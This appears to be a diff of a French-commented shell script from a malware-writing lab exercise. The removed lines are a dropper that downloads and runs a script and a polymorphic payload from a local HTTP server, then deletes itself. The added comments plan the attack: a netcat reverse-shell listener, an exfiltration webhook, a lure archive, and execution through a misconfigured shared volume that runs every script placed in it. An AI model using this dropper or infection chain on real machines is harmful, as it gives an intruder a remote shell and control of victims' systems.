@@ -1,21 +1,54 @@
-#wget http://192.168.1.126:8888/backup.log -o /usr/src/log/backup.log
-wget http://192.168.1.126:8888/tools/vulture_executioner.sh
-wget http://192.168.1.126:8888/tools/vulture_poly.zip
-mv vulture_* /tmp
-sleep 3
-./tmp/vulture_executioner.sh &
-rm -- "$0"
-# need to add a command to delete itself
 
 
+# pré setup
+# machine hote: serveur http python 8888 dans ./malware_research
+#               reverse shell nc -lvnp 4444
+#               ecoute sur le webhook : https://app.beeceptor.com/console/ouinonoui
+#
+# trouver une façon d'écouter plusieurs connection entrante sur un seul point
 
-
-# résumé cours:
+# résumé:
 # Je télécharge ça -> important.zip et je l'unzip dans mon bureau 1
 # le seeker télécharge -> vulture_executioner.sh et le met dans /tmp 2
 # le seeker télécharge aussi -> vulture_poly.zip 3
 # l'executioner compile et execute -> vulture_poly   4
 # si l'execution est bonne, on aura un reverse shell sur ma machine 5
+
+
+#
+#           MACHINE1: /usr/src/desktop                  MACHINE2: /usr/src/desktop
+#                       |                                    |
+#                       |                                    |
+#                       |                                    |
+#                       |                                    |
+#                       -------------------     -------------
+#                                           |
+#                                           |
+#                                           |
+#                                  VOLUME PARTAGÉ: /home/public   - exécute des scripts de sync sur le réséau
+#                                  VULNÉRABILITÉ: à cause d'une mauvaise configuration de l'admin sys, éxécute tout les scripts
+#                                                   dans le volume partagé
+#
+#
+#
+#
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
